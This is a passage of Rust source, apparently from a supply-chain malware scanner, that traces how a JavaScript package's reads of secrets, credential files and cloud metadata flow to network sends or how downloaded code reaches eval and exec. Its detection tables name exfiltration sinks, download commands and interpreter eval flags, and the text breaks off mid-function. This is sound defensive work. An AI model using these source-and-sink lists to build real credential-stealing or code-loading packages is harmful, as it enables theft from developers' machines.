//! The supply-chain model of the JavaScript pass (phase 3 step 3 of the
//! Rust-first refactor, docs/RUST_ENGINE.md §8): local data — what a script
//! reads from the machine — followed on the parsed tree through bindings,
//! the script's own functions, callbacks, closures and members of `this` to
//! a network send. It answers what `flow::local_data_sent_at` answers on raw
//! text — the first send, the kind of data, what was read, whether only an
//! address held it — with names resolved by scope instead of followed by
//! name within a window of text: a quote in a regular expression, a name
//! that means two things in a bundle, or thousands of assignments of padding
//! change nothing. A text the parser doesn't read, or a reading past its
//! work budget, is the text follower's to answer.
//!
//! Sources and sends are the text follower's, read from the same tables of
//! the rule pack: an environment variable by its name (`_SH_IDENTITY_VAR_RE`,
//! `_SH_SECRET_VAR_RE`, `_LD_ENV_QUIET_RE`) and the whole environment; the
//! os module's names (`_LD_MODULE_NAMES`); a file outside the package
//! (`_LD_READERS`, `flow::ld_outside`); what a command prints
//! (`shell::sh_output_data`); the instance's metadata and the public IP
//! address a lookup service gives. Sends are the calls `_LD_SEND_RE` and its
//! siblings name, with the arguments they count as addresses, resolved by
//! scope (`require('https').request`, `const r = module.require; r('http')`),
//! and what a connection or a client made by the script writes.
//!
//! The same reading answers received code (`received::received_code_kind`
//! on raw text): data the script receives over the network — a response, a
//! connection's or a server's data, what a download prints — reaching code
//! run (`eval`, `Function`, vm, `Module._compile`, exec, an interpreter
//! given `-e`), a module loaded by its name, or a deserializer.

use super::descs::{dedupe, D};
use super::driver::{fixpoint, Config, Out};
use crate::pystr;
use super::eval::{Eval, R};
use super::*;
use crate::flow::LiteralTest;
use crate::pack::Pack;
use std::sync::Arc;

// ---------------------------------------------------------------- the kinds --

pub const K_IDENTITY: u16 = 1 << 0;
pub const K_ENV: u16 = 1 << 1;
pub const K_WHOLE_ENV: u16 = 1 << 2;
pub const K_FILE: u16 = 1 << 3;
pub const K_REPORT: u16 = 1 << 4;
pub const K_CREDENTIALS: u16 = 1 << 5;
pub const K_ADDRESS: u16 = 1 << 6;
/// not local data: a path outside the package (a read of it is)
pub const K_PATH: u16 = 1 << 7;
/// a file of a credential store (`_CRED_STORE_RE`, not a public key's):
/// a file, kept apart so that a send of one is not hidden behind an
/// earlier read of another file
pub const K_CRED_FILE: u16 = 1 << 8;
/// not local data: data received over the network (a response, what a
/// socket or a server is sent, what a download prints); run as code, it is
/// received code
pub const K_RECEIVED: u16 = 1 << 9;

/// The kinds' names (the text follower's strings), by bit index.
pub const KIND_NAMES: [&str; 10] =
    ["identity", "environment", "environment", "file", "report", "credentials", "address", "path", "file", "received"];

/// The kinds a send of local data never reports.
pub(crate) const NOT_LOCAL: u16 = K_PATH | K_RECEIVED;

/// The kinds that count even when only an address holds them (the text
/// follower's `_LD_NOT_IN_ADDRESS` are the others, the whole environment
/// excepted).
pub(crate) const STRONG_IN_ADDRESS: u16 = K_IDENTITY | K_WHOLE_ENV | K_FILE | K_CRED_FILE | K_REPORT;

/// What no client sends (import_time_risk's harvest): the instance's
/// credentials, the whole environment, a credential store. A send that
/// carries one is reported by it, whatever was read before it.
pub(crate) const HARVEST: u16 = K_CREDENTIALS | K_WHOLE_ENV | K_CRED_FILE;

/// Is a finding of this kind and what a harvest (signs.rs grades it so)?
pub(crate) fn harvest_of(p: &Pack, kind: &str, what: &[u32], whole: &[u32]) -> bool {
    match kind {
        "credentials" => true,
        "environment" => what == whole,
        "file" => cred_store(p, what),
        _ => false,
    }
}

/// Does a file read's `what` name a credential store?
pub(crate) fn cred_store(p: &Pack, what: &[u32]) -> bool {
    p.re("_CRED_STORE_RE").search(what).is_some() && p.re("_PUBLIC_KEY_FILE_RE").search(what).is_none()
}

/// The kind's bit for a kind name (the text follower's, and shell.rs's).
pub(crate) fn kind_bit(kind: &str, what: &[u32], whole: &[u32]) -> u16 {
    match kind {
        "identity" | "lookup-identity" => K_IDENTITY,
        "environment" if what == whole => K_WHOLE_ENV,
        "environment" => K_ENV,
        "file" => K_FILE,
        "report" => K_REPORT,
        "credentials" => K_CREDENTIALS,
        "address" => K_ADDRESS,
        _ => K_IDENTITY,
    }
}

pub(crate) fn bit_index(bit: u16) -> u8 {
    bit.trailing_zeros() as u8
}

// V.kind marks (bits 1 and 2 are project mode's request and response objects)

/// a connection, or a request being written: its write, end, send … send
pub const OBJ_CONN: u8 = 4;
/// an HTTP client the script made (axios.create(), got.extend()): its
/// calls and its post, put, patch, request send
pub const OBJ_CLIENT: u8 = 8;
/// process.env itself: a member of it is one variable
pub const OBJ_ENV: u8 = 16;
/// the marks a closure's variable keeps
pub const MARKS: u8 = OBJ_CONN | OBJ_CLIENT | OBJ_ENV;

/// The categories a parameter's reach is recorded under: what is sent, and
/// what only an address holds.
pub const SEND_DATA: u8 = 0;
pub const SEND_ADDR: u8 = 1;
/// (a parameter that is the command line an exec call runs: the script's
/// own wrapper of exec)
pub const EXEC_CMD: u8 = 2;
/// (a parameter that is the path a read reads: the script's own reader)
pub const READ_PATH: u8 = 3;
/// (a parameter that names the environment variable read: `getEnv(name)`)
pub const ENV_NAME: u8 = 4;
/// The categories of received code (the text detector's): a parameter
/// that is code run, the name of a module loaded, data deserialized.
pub const RUN_CODE: u8 = 5;
pub const LOAD_NAME: u8 = 6;
pub const DESERIALIZE: u8 = 7;

/// A received-code category's name (`_DL_CATEGORY_REASON`'s keys).
pub fn received_cat(cat: u8) -> Option<&'static str> {
    match cat {
        RUN_CODE => Some("run"),
        LOAD_NAME => Some("import"),
        DESERIALIZE => Some("deserialize"),
        _ => None,
    }
}

// ---------------------------------------------------------------- the model --

/// The supply-chain model of one text: the pack, the text (its spans are
/// what the text follower's tests read) and what is known before reading.
pub struct Supply {
    pub pack: Arc<Pack>,
    pub text: Vec<u32>,
    pub lit: LiteralTest,
    /// the names that hold a path outside the package (core's `outside`)
    pub outside: std::cell::RefCell<HashSet<PyStr>>,
    pub whole: PyStr,
    /// a function given as an argument -> the call it is given to (built
    /// when first asked)
    pub arg_of: std::cell::RefCell<Option<std::collections::HashMap<NodeId, NodeId>>>,
}

use std::collections::HashSet;

impl Supply {
    pub fn new(pack: Arc<Pack>, text: &[u32]) -> Supply {
        let lit = LiteralTest::new(&pack, text);
        let whole = pack.text("_LD_WHOLE_ENV");
        Supply {
            pack,
            text: text.to_vec(),
            lit,
            outside: std::cell::RefCell::new(HashSet::new()),
            whole,
            arg_of: std::cell::RefCell::new(None),
        }
    }

    fn p(&self) -> &Pack {
        &self.pack
    }

    fn span(&self, lo: u32, hi: u32) -> &[u32] {
        let lo = (lo as usize).min(self.text.len());
        let hi = (hi as usize).min(self.text.len()).max(lo);
        &self.text[lo..hi]
    }
}

/// The send a call is: the arguments it counts as addresses (-1 all of
/// them, 0 none, n the first n), and whether only a name composed with a
/// literal counts (a DNS lookup).
#[derive(Clone, Copy, Debug)]
struct Spec {
    addresses: i8,
    composed: bool,
}

const SEND1: Spec = Spec { addresses: 1, composed: false };
const OPTIONS: Spec = Spec { addresses: 0, composed: false };
const REQUEST2: Spec = Spec { addresses: 2, composed: false };
const ADDRESS: Spec = Spec { addresses: -1, composed: false };
const LOOKUP: Spec = Spec { addresses: -1, composed: true };

/// The HTTP clients a name no declaration binds is taken for.
pub const CLIENT_GLOBALS: &[&str] = &["axios", "got", "needle", "superagent", "ky", "undici"];

const FETCH_MODULES: &[&str] = &[
    "node-fetch", "cross-fetch", "isomorphic-fetch", "isomorphic-unfetch", "make-fetch-happen", "minipass-fetch",
    "node-fetch-native", "ofetch",
];
const POSTERS: &[&str] = &["axios", "got", "needle", "superagent", "ky"];
const CONN_WRITES: &[&str] = &["write", "end", "send", "sendall", "sendto", "request"];
const CONN_CHAIN: &[&str] =
    &["on", "once", "addListener", "prependListener", "setHeader", "setTimeout", "setNoDelay", "setKeepAlive", "setEncoding"];
const EXEC_NAMES: &[&str] =
    &["execSync", "execFileSync", "spawnSync", "exec", "execFile", "execa", "execaSync", "execaCommand", "execaCommandSync"];
const FETCHERS: &[&str] = &["fetch", "axios.get", "http.get", "https.get", "got", "got.get"];

fn last_part(name: &[u32]) -> &[u32] {
    match name.iter().rposition(|&c| c == 0x2E) {
        Some(k) => &name[k + 1..],
        None => name,
    }
}

fn is_one(name: &[u32], set: &[&str]) -> bool {
    set.iter().any(|s| eq(name, s))
}

fn dotted2<'a>(a: &'a str, b: &'a [&'a str]) -> impl Fn(&[u32]) -> bool + 'a {
    move |name: &[u32]| b.iter().any(|m| eq(name, &format!("{}.{}", a, m)))
}

/// Is a literal's text a URL that its host continues past (`'https://'`,
/// `'http://x-'`): what is joined to it next is resolved as a host name?
pub(crate) fn host_prefix(text: &[u32]) -> bool {
    let low: Vec<u32> = text.iter().map(|&c| if (0x41..=0x5A).contains(&c) { c + 32 } else { c }).collect();
    let rest = ["https://", "http://", "wss://", "ws://"].iter().find_map(|s| {
        let s: Vec<u32> = s.chars().map(|c| c as u32).collect();
        if low.len() >= s.len() && low[..s.len()] == s[..] {
            Some(&low[s.len()..])
        } else {
            None
        }
    });
    match rest {
        // (the host goes on into what is joined: nothing yet, a label not
        // ended, or one ended by '.' or '-'; `'http://x.com' + path` is a path)
        Some(r) => {
            r.len() <= 200
                && !r.iter().any(|&c| {
                    matches!(c, 0x2F | 0x3F | 0x23 | 0x22 | 0x27 | 0x60 | 0x3A) || char::from_u32(c).is_some_and(|ch| ch.is_whitespace())
                })
                && (r.is_empty() || matches!(r[r.len() - 1], 0x2E | 0x2D) || !r.contains(&0x2E))
        }
        None => false,
    }
}

/// Calls whose value is a number or a flag, not the data they are given.
const NUMERIC: &[&str] = &[
    "Buffer.byteLength", "byteLength", "parseInt", "parseFloat", "Number", "Boolean", "Math.floor", "Math.round",
    "Math.ceil", "Math.abs", "Math.trunc", "Math.min", "Math.max", "Date.now", "isNaN", "isFinite",
];

/// The send a callee's names make, if any.
fn send_spec(names: &[PyStr]) -> Option<Spec> {
    for n in names {
        let n = n.as_slice();
        if eq(n, "fetch") || is_one(n, FETCH_MODULES) || eq(n, "undici.fetch") || eq(n, "undici.request") {
            return Some(SEND1);
        }
        if eq(n, "navigator.sendBeacon") || eq(n, "sendBeacon") || eq(n, "Request") {
            return Some(SEND1);
        }
        for m in POSTERS {
            if dotted2(m, &["post", "put", "patch"])(n) {
                return Some(SEND1);
            }
        }
        if eq(n, "axios") || eq(n, "axios.request") {
            return Some(OPTIONS);
        }
        if is_one(n, &["http.get", "http.request", "https.get", "https.request", "axios.get", "got", "got.get"]) {
            return Some(ADDRESS);
        }
        if eq(n, "dns.lookup") || eq(n, "dns.promises.lookup") {
            return Some(LOOKUP);
        }
        let starts = |p: &str| n.len() >= p.len() && eq(&n[..p.len()], p);
        if starts("dns.resolve") || starts("dns.promises.resolve") {
            return Some(LOOKUP);
        }
    }
    None
}

/// Does a call of these names make a connection (its writes send)?
fn makes_connection(names: &[PyStr]) -> bool {
    names.iter().any(|n| {
        is_one(
            n,
            &[
                "http.request", "https.request", "http.get", "https.get", "http2.connect", "net.connect",
                "net.createConnection", "tls.connect", "dgram.createSocket",
            ],
        )
    })
}

/// Does a call of these names make a client (its calls send)?
fn makes_client(names: &[PyStr]) -> bool {
    names.iter().any(|n| {
        is_one(n, &["axios.create", "got.extend", "got.create", "ky.create", "ky.extend"])
    })
}

/// A client's calls that make a request (its value, and its callbacks,
/// are what the request receives).
const CLIENT_CALLS: &[&str] = &["get", "post", "put", "patch", "delete", "head", "options", "request", "stream", "fetch"];

/// Does a call of these names receive data over the network: a request (its
/// response, and the callbacks given it), a connection, a server (what it is
/// sent)?
fn receives(names: &[PyStr]) -> bool {
    names.iter().any(|n| {
        let n = n.as_slice();
        if eq(n, "fetch") || is_one(n, FETCH_MODULES) {
            return true;
        }
        if is_one(
            n,
            &[
                "http.get", "http.request", "https.get", "https.request", "http2.connect", "net.connect",
                "net.createConnection", "tls.connect", "dgram.createSocket", "http.createServer", "https.createServer",
                "http2.createServer", "http2.createSecureServer", "net.createServer", "tls.createServer",
                "undici.fetch", "undici.request", "undici.stream", "request-promise", "request-promise-native",
                "simple-get",
            ],
        ) {
            return true;
        }
        POSTERS.iter().any(|m| eq(n, m) || CLIENT_CALLS.iter().any(|c| eq(n, &format!("{}.{}", m, c))))
    })
}

/// Does a command line download: curl or wget first (`_DL_SOURCE`'s exec
/// form)? What it prints is received, unless it asks the instance's
/// metadata or a public-IP service (local data: credentials, the address).
pub(crate) fn downloads(p: &Pack, command: &[u32]) -> bool {
    let t = pystr::lstrip(command);
    ["curl", "wget"].iter().any(|w| {
        t.len() >= w.len()
            && eq(&t[..w.len()], w)
            && t.get(w.len()).map_or(true, |&c| !(c == 0x5F || c == 0x2D || char::from_u32(c).is_some_and(|ch| ch.is_alphanumeric())))
    }) && p.re("_LD_METADATA_RE").search(command).is_none()
        && p.re("_LD_PUBLIC_IP_RE").search(command).is_none()
}

/// The interpreters a command line is given code to run with (`_DL_INTERP`).
pub(crate) const INTERPRETERS: &[&str] = &[
    "node", "nodejs", "bun", "deno", "sh", "bash", "zsh", "dash", "ksh", "python", "python3", "python2", "pythonw",
    "perl", "ruby", "php", "pwsh", "powershell", "osascript", "cmd",
];
/// The flags that make an interpreter run its next argument as code.
pub(crate) const EVAL_FLAGS: &[&str] = &[
    "-e", "-E", "-c", "-p", "-r", "--eval", "--print", "-Command", "-command", "-EncodedCommand", "-enc", "/c", "/C",
    "/k", "/K",
];
/// The global constructors whose `.constructor` is Function.
const CONSTRUCTORS: &[&str] =
    &["Function", "Object", "Array", "String", "Number", "Boolean", "Promise", "Date", "RegExp", "Error", "Symbol"];

/// What a received-code sink takes as its code: its category, the first
/// argument that is code, and whether every argument after it is too.
#[derive(Clone, Copy, Debug)]
struct Runs {
    cat: u8,
    from: usize,
    rest: bool,
}

/// The sink a callee's names are, if any (the text detector's runners,
/// import sinks and deserializers, `_DL_RUNNER`, `_DL_IMPORT_SINK`,
/// `_DL_DESERIAL`, by binding).
fn runs_of(names: &[PyStr]) -> Option<Runs> {
    for n in names {
        let n = n.as_slice();
        if eq(n, "eval") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
        }
        if eq(n, "Function") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: true });
        }
        // (a bare execSync or exec no declaration binds is child_process's: a
        // snippet that leaves out its require)
        if is_one(
            n,
            &[
                "vm.runInThisContext", "vm.runInNewContext", "vm.runInContext", "vm.compileFunction",
                "child_process.exec", "child_process.execSync", "shelljs.exec", "execSync", "exec",
            ],
        ) {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
        }
        if eq(n, "require") || eq(n, "module.require") {
            return Some(Runs { cat: LOAD_NAME, from: 0, rest: false });
        }
        if eq(last_part(n), "unserialize") || is_one(n, &["js-yaml.load", "yaml.load"]) {
            return Some(Runs { cat: DESERIALIZE, from: 0, rest: false });
        }
    }
    None
}

impl<'p> Eval<'p> {
    fn sup(&self) -> Rc<Supply> {
        self.p.cfg.supply.clone().expect("the supply-chain model")
    }

    /// A value read from the machine: `bit` with `what`, read at `at`.
    fn sc_source(&self, bit: u16, what: PyStr, at: u32, line: u32, mark: u8) -> V {
        let bit = if bit == K_FILE && cred_store(self.sup().p(), &what) { K_CRED_FILE } else { bit };
        let f = &self.p.fns[self.fid as usize];
        let fname = if f.is_module { None } else { f.name.clone().map(Rc::new) };
        let sc = Sc { kinds: bit, firsts: vec![(bit_index(bit), Rc::new(what), at)] };
        V::new(true, Some((self.m, line)), fname, None, V::empty().params, 0, false, mark).with_sc(Some(Rc::new(sc)))
    }

    /// One variable of the environment, by its name.
    fn sc_env_var(&self, name: &[u32], at: u32, line: u32) -> V {
        let sup = self.sup();
        let p = sup.p();
        if p.re("_SH_IDENTITY_VAR_RE").match_(name).is_some() {
            return self.sc_source(K_IDENTITY, name.to_vec(), at, line, 0);
        }
        if p.re("_SH_SECRET_VAR_RE").search(name).is_some() && p.re("_LD_ENV_QUIET_RE").match_(name).is_none() {
            return self.sc_source(K_ENV, name.to_vec(), at, line, 0);
        }
        if is_one(name, &["HOME", "USERPROFILE", "APPDATA", "LOCALAPPDATA", "INIT_CWD", "HOMEPATH"]) {
            return self.sc_source(K_PATH, name.to_vec(), at, line, 0);
        }
        V::empty()
    }

    /// A pattern's name given a value: one variable when the value is
    /// process.env itself and the path names it.
    pub(super) fn sc_pattern_value(&self, v: &V, path: &Path, ident: NodeId) -> Option<V> {
        if v.kind & OBJ_ENV == 0 || path.len() != 1 {
            return None;
        }
        let a = self.a();
        let (at, line) = (a.0.nodes[ident as usize].start, a.line(ident));
        Some(match &path[0] {
            Some(name) => self.sc_env_var(name, at, line),
            None => v.plain(),
        })
    }

    /// The names a callee resolves to: `os.hostname`, `https.request`,
    /// `axios.post` (a package's member), `fetch` (a global, also through
    /// globalThis, window, self or global).
    fn sc_names(&mut self, callee: NodeId, scope: ScopeId) -> Vec<PyStr> {
        let m = self.m;
        let mut out: Vec<PyStr> = Vec::new();
        let (member, obj, prop) = {
            let a = self.a();
            if a.kind(callee) == Kind::MemberExpression {
                (true, a.at(callee, jt::A), a.prop_name(callee))
            } else {
                (false, NONE, None)
            }
        };
        if member {
            if let Some(prop) = &prop {
                // a global's own member: self.fetch, global.fetch
                let global_obj = {
                    let a = self.a();
                    a.kind(obj) == Kind::Identifier
                        && ["globalThis", "window", "self", "global"].iter().any(|g| eq(a.name(obj), g))
                };
                if global_obj && self.bind(obj, scope).is_none() {
                    out.push(prop.clone());
                }
                for d in self.p.descs_of_expr(m, obj, scope, 0) {
                    if let D::Pkg(pk) = d {
                        let mut n = pk.clone();
                        n.push(0x2E);
                        n.extend_from_slice(prop);
                        out.push(n);
                    }
                }
            }
        }
        for d in self.p.descs_of_expr(m, callee, scope, 0) {
            match d {
                D::Builtin(b) => {
                    let mut n = b.clone();
                    for g in ["globalThis.", "window."] {
                        if n.len() > g.len() && eq(&n[..g.len()], g) {
                            n = n[g.len()..].to_vec();
                        }
                    }
                    out.push(n);
                }
                D::Global(g) => out.push(g),
                D::Pkg(pk) => out.push(pk),
                _ => {}
            }
        }
        dedupe(out)
    }

    /// The string a node is when it is constant: a string literal, a
    /// template without holes.
    fn sc_const_str(&self, node: NodeId) -> Option<PyStr> {
        let a = self.a();
        if let Some(v) = a.str_value(node) {
            return Some(v.to_vec());
        }
        if a.kind(node) == Kind::TemplateLiteral && a.list(node, jt::B).is_empty() {
            let q = a.list(node, jt::A);
            return Some(q.first().map(|&e| a.s(e, jt::A).to_vec()).unwrap_or_default());
        }
        None
    }

    /// The strings an expression may be, when they are constants: a literal,
    /// a name given one, an item of a constant list it is taken from (`for
    /// (const c of ['id', 'whoami'])`, `cmds.forEach((c) => …)`, `cmds[i]`).
    fn sc_const_strs(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> Option<Vec<PyStr>> {
        if depth > 8 || node == NONE {
            return None;
        }
        if let Some(s) = self.sc_const_str(node) {
            return Some(vec![s]);
        }
        match self.a().kind(node) {
            Kind::Identifier => {
                let b = self.bind(node, scope)?;
                let (module, writes, fid) = {
                    let bind = &self.p.binds[b as usize];
                    // (a declaration without a value writes nothing: `for (const c of …)`)
                    let writes: Vec<Write> = bind.writes.iter().filter(|w| !matches!(w, Write::Nothing { .. })).cloned().collect();
                    (bind.module, writes, bind.fid)
                };
                if module != self.m || writes.len() != 1 {
                    return None;
                }
                match &writes[0] {
                    Write::Init { node: v, scope: sc, path } if path.is_empty() => self.sc_const_strs(*v, *sc, depth + 1),
                    // an item of what a for-of loop goes over
                    Write::Opaque { node: st, scope: sc } if self.a().kind(*st) == Kind::ForOfStatement => {
                        let right = self.a().at(*st, jt::B);
                        self.sc_items(right, *sc, depth + 1)
                    }
                    // the first parameter of a callback given a list's items
                    Write::Param { index: 0, .. } => {
                        let fnode = self.p.fns[fid as usize].node;
                        let call = self.sc_call_of_arg(fnode)?;
                        let callee = self.a().unwrap(self.a().at(call, jt::A));
                        let a = self.a();
                        let iterates = a.kind(callee) == Kind::MemberExpression
                            && a.prop_name(callee).is_some_and(|n| {
                                is_one(&n, &["forEach", "map", "filter", "some", "every", "flatMap", "find"])
                            });
                        if !iterates {
                            return None;
                        }
                        let obj = a.at(callee, jt::A);
                        let fscope = self.p.fns[fid as usize].scope;
                        let outer = self.p.scopes[fscope as usize].parent.unwrap_or(fscope);
                        self.sc_items(obj, outer, depth + 1)
                    }
                    _ => None,
                }
            }
            // cmds[i]: any of its items
            Kind::MemberExpression if self.a().computed(node) => {
                let obj = self.a().at(node, jt::A);
                self.sc_items(obj, scope, depth + 1)
            }
            _ => None,
        }
    }

    /// The items of a constant list of strings (a literal, or a name given one).
    fn sc_items(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> Option<Vec<PyStr>> {
        if depth > 8 {
            return None;
        }
        match self.a().kind(node) {
            Kind::ArrayExpression => {
                let items = self.a().list(node, jt::A).to_vec();
                let mut out = Vec::new();
                for e in items.into_iter().take(64) {
                    if e != NONE {
                        out.extend(self.sc_const_strs(e, scope, depth + 1)?);
                    }
                }
                Some(out)
            }
            Kind::Identifier => {
                let b = self.bind(node, scope)?;
                let bind = &self.p.binds[b as usize];
                if bind.module != self.m || bind.writes.len() != 1 {
                    return None;
                }
                match bind.writes[0].clone() {
                    Write::Init { node: v, scope: sc, path } if path.is_empty() => self.sc_items(v, sc, depth + 1),
                    _ => None,
                }
            }
            _ => None,
        }
    }

    /// The call a function literal is given to as an argument, if any.
    fn sc_call_of_arg(&self, fnode: NodeId) -> Option<NodeId> {
        let sup = self.sup();
        if sup.arg_of.borrow().is_none() {
            let a = self.a();
            let mut map = std::collections::HashMap::new();
            for id in 0..a.0.nodes.len() as NodeId {
                if a.kind(id) == Kind::CallExpression {
                    for &arg in a.list(id, jt::B) {
                        if a.is_function(arg) {
                            map.insert(arg, id);
                        }
                    }
                }
            }
            *sup.arg_of.borrow_mut() = Some(map);
        }
        let got = sup.arg_of.borrow().as_ref().and_then(|m| m.get(&fnode).copied());
        got
    }

    /// The command line an exec call runs, when it is constant: its first
    /// argument (an argument list's items joined) and the string arguments
    /// after it.
    fn sc_command_line(&self, node: NodeId) -> Option<PyStr> {
        let a = self.a();
        let args = a.list(node, jt::B).to_vec();
        let first = *args.first()?;
        let mut argv: Vec<PyStr> = Vec::new();
        if a.kind(first) == Kind::ArrayExpression {
            for &e in a.list(first, jt::A) {
                if e != NONE {
                    if let Some(s) = self.sc_const_str(e) {
                        argv.push(s);
                    }
                }
            }
            if argv.is_empty() {
                return None;
            }
        } else {
            argv.push(self.sc_const_str(first)?);
        }
        for &e in args.iter().skip(1).take(8) {
            if a.kind(e) == Kind::ArrayExpression {
                for &x in a.list(e, jt::A) {
                    if x != NONE {
                        if let Some(s) = self.sc_const_str(x) {
                            argv.push(s);
                        }
                    }
                }
            } else if let Some(s) = self.sc_const_str(e) {
                argv.push(s);
            }
        }
        let parts: Vec<&[u32]> = argv.iter().map(|x| x.as_slice()).collect();
        Some(pystr::join(&u(" "), &parts))
    }

    /// Is a member's name one of the module table's (a cheap test first)?
    fn sc_reader_name(&self, name: &[u32]) -> bool {
        const NAMES: &[&str] = &["hostname", "userInfo", "homedir", "networkInterfaces", "getlogin", "uname"];
        is_one(name, NAMES)
    }

    /// The os module's names (and the user's or host's name under another
    /// module's): a read of local data, by the names a callee resolves to.
    fn sc_module_source(&self, names: &[PyStr], at: u32, line: u32) -> Option<V> {
        let sup = self.sup();
        let p = sup.p();
        for n in names {
            let n = n.as_slice();
            let k = match n.iter().position(|&c| c == 0x2E) {
                Some(k) => k,
                None => continue,
            };
            let (module, member) = (&n[..k], &n[k + 1..]);
            if let Some((_, kind)) = crate::flow::module_names(p, module).into_iter().find(|(name, _)| name.as_slice() == member) {
                let what = if eq(module, "os") && p.strs("_LD_OS_NAMED").iter().any(|x| x.as_slice() == member) {
                    member.to_vec()
                } else {
                    u("user or host name")
                };
                let v = self.sc_source(kind_bit(kind, &what, &sup.whole), what.clone(), at, line, 0);
                if eq(member, "homedir") {
                    // (and a path outside the package: a read under it is a file)
                    return Some(v.union(&self.sc_source(K_PATH, what, at, line, 0)));
                }
                return Some(v);
            }
        }
        None
    }

    /// A string literal: a path outside the package (a read of it is a
    /// file), else nothing.
    pub(super) fn sc_literal(&self, node: NodeId) -> V {
        let a = self.a();
        let value = match a.str_value(node) {
            Some(v) if !v.is_empty() => v,
            _ => return V::empty(),
        };
        let first = value[0];
        let drive = value.len() > 2 && (value[1] == 0x3A) && (value[2] == 0x5C || value[2] == 0x2F);
        if !(first == 0x2F || first == 0x7E || first == 0x24 || first == 0x25 || drive) {
            return V::empty();
        }
        let sup = self.sup();
        let n = &a.0.nodes[node as usize];
        // (a system folder, the home folder, a credential file; any absolute
        // path only where a read is given it whole: sc_source_call)
        let span = sup.span(n.start, n.end);
        if sup.p().re("_LD_FS_ROOT_RE").match_(span).is_none() && sup.p().re("_LD_CRED_FILE_RE").match_(span).is_none() {
            return V::empty();
        }
        self.sc_source(K_PATH, pystr::upto(value, 60).to_vec(), n.start, a.line(node), 0)
    }

    /// An identifier no declaration binds (an implicit global, or one the
    /// script assigns): a binding the model keeps for its name.
    pub(super) fn sc_global_bind(&mut self, ident: NodeId) -> BindId {
        let name = self.a().name(ident).to_vec();
        let m = self.m;
        let key = (3u8, m, name.clone());
        if let Some(&b) = self.p.sc_props.get(&key) {
            return b;
        }
        let bid = self.p.binds.len() as BindId;
        let fid = self.p.mods[m as usize].fn_;
        self.p.binds.push(Bind {
            bid,
            name,
            kind: BindKind::Var,
            fid,
            writes: Vec::new(),
            shared: true,
            module: m,
            refs: Vec::new(),
            targets: None,
        });
        self.p.sc_props.insert(key, bid);
        bid
    }

    /// A call that reads local data: its value, if it is one.
    fn sc_source_call(&mut self, node: NodeId, names: &[PyStr], args: &[V], scope: ScopeId) -> Option<V> {
        let sup = self.sup();
        let p = sup.p();
        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
        if let Some(v) = self.sc_module_source(names, at, line) {
            return Some(v);
        }
        let last: PyStr = names.first().map(|n| last_part(n).to_vec()).unwrap_or_else(|| {
            let a = self.a();
            let callee = a.unwrap(a.at(node, jt::A));
            if a.is_ident(callee) {
                a.name(callee).to_vec()
            } else if a.kind(callee) == Kind::MemberExpression {
                a.prop_name(callee).unwrap_or_default()
            } else {
                Vec::new()
            }
        });
        // what a command prints (a download's is received: sc_call)
        if is_one(&last, EXEC_NAMES) {
            if let Some(line_text) = self.sc_command_line(node) {
                if let Some((kind, what)) = crate::shell::sh_output_data(p, &line_text, 0, None).into_iter().next() {
                    return Some(self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, line, 0));
                }
            } else if let Some(first) = self.a().list(node, jt::B).first().copied() {
                // (a command taken from a constant list: what any of them prints)
                if let Some(commands) = self.sc_const_strs(first, scope, 0) {
                    let mut out = V::empty();
                    for c in commands {
                        if let Some((kind, what)) = crate::shell::sh_output_data(p, &c, 0, None).into_iter().next() {
                            out = out.union(&self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, line, 0));
                        }
                    }
                    if out.tainted() {
                        return Some(out);
                    }
                }
            }
            return None;
        }
        // a file outside the package
        let readers = p.strs("_LD_READERS");
        if readers.iter().any(|r| r.as_slice() == last.as_slice()) && !p.strs("_LD_NOT_READS").iter().any(|r| r.as_slice() == last.as_slice()) {
            let a = self.a();
            if let Some(&first) = a.list(node, jt::B).first() {
                let (lo, hi) = (a.0.nodes[first as usize].start, a.0.nodes[first as usize].end);
                let outside = crate::flow::ld_outside(p, &sup.text, lo as usize, hi as usize, true, &sup.outside.borrow(), &sup.lit);
                if outside {
                    let arg = sup.span(lo, hi);
                    let what = match p.re("_LD_PLAIN_LITERAL_RE").match_(arg) {
                        Some(pl) => pl.group(2).unwrap_or(&[]).to_vec(),
                        None => arg.to_vec(),
                    };
                    return Some(self.sc_source(K_FILE, pystr::upto(&what, 60).to_vec(), at, line, 0));
                }
                // (a path outside the package given it: a parameter, a name)
                if let Some(sc) = args.first().and_then(|v| v.sc.clone()) {
                    if let Some((_, what, _)) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PATH) {
                        return Some(self.sc_source(K_FILE, pystr::upto(what, 60).to_vec(), at, line, 0));
                    }
                }
                // (a parameter: the script's own reader, for its callers)
                if let Some(v) = args.first() {
                    if !v.params.is_empty() {
                        let label = Rc::new(self.p.fns[self.fid as usize].label());
                        let entry: Entry = (self.m, at, label, false);
                        for &key in v.params.iter() {
                            self.reach_adds.push((key, READ_PATH, entry.clone()));
                        }
                    }
                }
            }
            return None;
        }
        // the instance's metadata, the machine's public IP address
        if names.iter().any(|n| is_one(n, FETCHERS) || is_one(n, FETCH_MODULES)) {
            let a = self.a();
            let args = a.list(node, jt::B);
            if let (Some(&f), Some(&l)) = (args.first(), args.last()) {
                let text = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
                if p.re("_LD_METADATA_RE").search(text).is_some() {
                    return Some(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, line, 0));
                }
                if p.re("_LD_PUBLIC_IP_RE").search(text).is_some() {
                    return Some(self.sc_source(K_ADDRESS, u("the machine's public IP address"), at, line, 0));
                }
            }
        }
        None
    }

    /// Is an argument a name composed with a literal (`h + '.x.com'`,
    /// a template with text), or a name given one?
    fn sc_composed(&self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
        let a = self.a();
        match a.kind(node) {
            Kind::TemplateLiteral => {
                !a.list(node, jt::B).is_empty() && a.list(node, jt::A).iter().any(|&q| !a.s(q, jt::A).is_empty())
            }
            Kind::BinaryExpression if a.operator(node) == "+" => {
                let mut n = node;
                let mut seen = 0;
                loop {
                    if a.is_string(a.at(n, jt::B)) {
                        return true;
                    }
                    let left = a.at(n, jt::A);
                    if a.is_string(left) {
                        return true;
                    }
